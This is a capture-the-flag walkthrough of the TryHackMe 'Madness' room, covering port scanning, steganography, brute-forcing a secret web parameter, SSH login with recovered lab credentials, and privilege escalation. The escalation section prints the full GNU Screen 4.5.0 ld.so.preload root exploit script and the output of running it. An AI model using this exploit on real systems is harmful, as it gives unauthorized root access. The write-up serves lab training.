# Madness(THM)

## Port Scanning

```bash
**┌──(bc-here㉿kali)-[~/CTF{}/THM]
└─$ sudo nmap -sS -sV -O mad >> ports.txt 

22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))**

```

## Web Server

- `[http://mad](http://mad/)/`   here we found that the webserver is running on Apache2

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image.png)

- The purple dot is an image but the image is not opening.
- [`http://mad/thm.jpg`](http://mad/thm.jpg)  lets download the image.

## THM Given Image

![5iW7kC8.jpg](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/5iW7kC8.jpg)

- If we extract this image we find some interesting things like a `.out` file and a `password.txt` file

```bash

┌──(bc-here㉿kali)-[~/CTF{}/THM/madness]
└─$ stegseek -sf intropic.jpg        
StegSeek 0.6 - https://github.com/RickdeJager/StegSeek

[i] Found passphrase: ""
[i] Original filename: "password.txt".
[i] Extracting to "intropic.jpg.out".

┌──(bc-here㉿kali)-[~/CTF{}/THM/madness]
└─$ cat intropic.jpg.out 
I didn't think you'd find me! Congratulations!

Here take my password

*axA&GF8dP
```

## Hex Code

- If we see the hex code of thm.jpg file we can find that format is not jpg rather its png
- We have to change it to jpg or `JFIF` format.
- [File Extension Changer in Hex Mode (wiki)](https://en.wikipedia.org/wiki/List_of_file_signatures?source=post_page-----8a8080672083--------------------------------)

```bash
┌──(bc-here㉿kali)-[~/CTF{}/THM/madness]
└─$ hexeditor thm.jpg 
```

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%201.png)

```bash
┌──(bc-here㉿kali)-[~/CTF{}/THM/madness]
└─$ open thm.jpg  
```

![2024-08-24_08-43.bmp](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/2024-08-24_08-43.bmp)

## Hidden Directory

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%202.png)

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%203.png)

- There is a semicolon after `Secret Entered:` and the comment is saying that the secret key will be from `0-99`
- Lets bruteFroce that using `burpsuite`

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%204.png)

- `/?secret=`  parameter also work for the secret entry.
- So now we can bruteFroce from 0-99 in this paramater in the burp intuder

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%205.png)

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%206.png)

- I went for 73 because its the longest!
- Urgh, you got it right! But I won't tell you who I am! `y2RPJ4QaPF!B`

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%207.png)

- username → wbxre

## SSH Login

![2024-08-24_09-51.bmp](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/2024-08-24_09-51.bmp)

## User Flag

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%208.png)

## Getting Privilege

```bash
joker@ubuntu:/home$ find / -type f -perm -04000 -ls 2>/dev/null

   150852   1552 -rwsr-xr-x   1 root     root        1588648 Jan  4  2020 /bin/screen-4.5.0

```

```bash
┌──(bc-here㉿kali)-[~/CTF{}/THM/madness]
└─$ searchsploit screen 4.5.0
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                        |  Path
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
GNU Screen 4.5.0 - Local Privilege Escalation                                                                                         | linux/local/41154.sh
GNU Screen 4.5.0 - Local Privilege Escalation (PoC)                                                                                   | linux/local/41152.txt
-------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(bc-here㉿kali)-[~/CTF{}/THM/madness]
└─$ searchsploit -m 41154
  Exploit: GNU Screen 4.5.0 - Local Privilege Escalation
      URL: https://www.exploit-db.com/exploits/41154
     Path: /usr/share/exploitdb/exploits/linux/local/41154.sh
    Codes: N/A
 Verified: True
File Type: Bourne-Again shell script, ASCII text executable
Copied to: /home/bc-here/CTF{}/THM/madness/41154.sh

```

The shell is…….

```bash
#!/bin/bash
# screenroot.sh
# setuid screen v4.5.0 local root exploit
# abuses ld.so.preload overwriting to get root.
# bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
# HACK THE PLANET
# ~ infodox (25/1/2017)
echo "~ gnu/screenroot ~"
echo "[+] First, we create our shell and library..."
cat << EOF > /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
__attribute__ ((__constructor__))
void dropshell(void){
    chown("/tmp/rootshell", 0, 0);
    chmod("/tmp/rootshell", 04755);
    unlink("/etc/ld.so.preload");
    printf("[+] done!\n");
}
EOF
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
rm -f /tmp/libhax.c
cat << EOF > /tmp/rootshell.c
#include <stdio.h>
int main(void){
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
EOF
gcc -o /tmp/rootshell /tmp/rootshell.c
rm -f /tmp/rootshell.c
echo "[+] Now we create our /etc/ld.so.preload file..."
cd /etc
umask 000 # because
screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
echo "[+] Triggering..."
screen -ls # screen itself is setuid, so...
/tmp/rootshell  
```

- Copy the shell and create a file on the target machine and run it

```bash
joker@ubuntu:~$ nano tuises.sh
joker@ubuntu:~$ chmod +x tuises.sh 
joker@ubuntu:~$ ./tuises.sh 
~ gnu/screenroot ~
[+] First, we create our shell and library...
/tmp/libhax.c: In function ‘dropshell’:
/tmp/libhax.c:7:5: warning: implicit declaration of function ‘chmod’ [-Wimplicit-function-declaration]
     chmod("/tmp/rootshell", 04755);
     ^
/tmp/rootshell.c: In function ‘main’:
/tmp/rootshell.c:3:5: warning: implicit declaration of function ‘setuid’ [-Wimplicit-function-declaration]
     setuid(0);
     ^
/tmp/rootshell.c:4:5: warning: implicit declaration of function ‘setgid’ [-Wimplicit-function-declaration]
     setgid(0);
     ^
/tmp/rootshell.c:5:5: warning: implicit declaration of function ‘seteuid’ [-Wimplicit-function-declaration]
     seteuid(0);
     ^
/tmp/rootshell.c:6:5: warning: implicit declaration of function ‘setegid’ [-Wimplicit-function-declaration]
     setegid(0);
     ^
/tmp/rootshell.c:7:5: warning: implicit declaration of function ‘execvp’ [-Wimplicit-function-declaration]
     execvp("/bin/sh", NULL, NULL);
     ^
[+] Now we create our /etc/ld.so.preload file...
[+] Triggering...
' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
[+] done!
No Sockets found in /tmp/screens/S-joker.

# whoami
root
```

- In our country `tuises`  means you are finished! 😁😁

## Root Flag

![image.png](Madness(THM)%201a46c9ed6e9b41c98c3905d65692574b/image%209.png)

## Potential Creds

1. `Password:` →  `*axA&GF8dP` 
    1. It could be a hash format
2. /hiddenDirectory from hex edit
3. `y2RPJ4QaPF!B` → passphrase for thm.jpg
4. username → `wbxre`
    1. It doesn’t seem to be a valid username lets try to decode it.
5. Its a ROT13 format which is `wbxre` → `joker`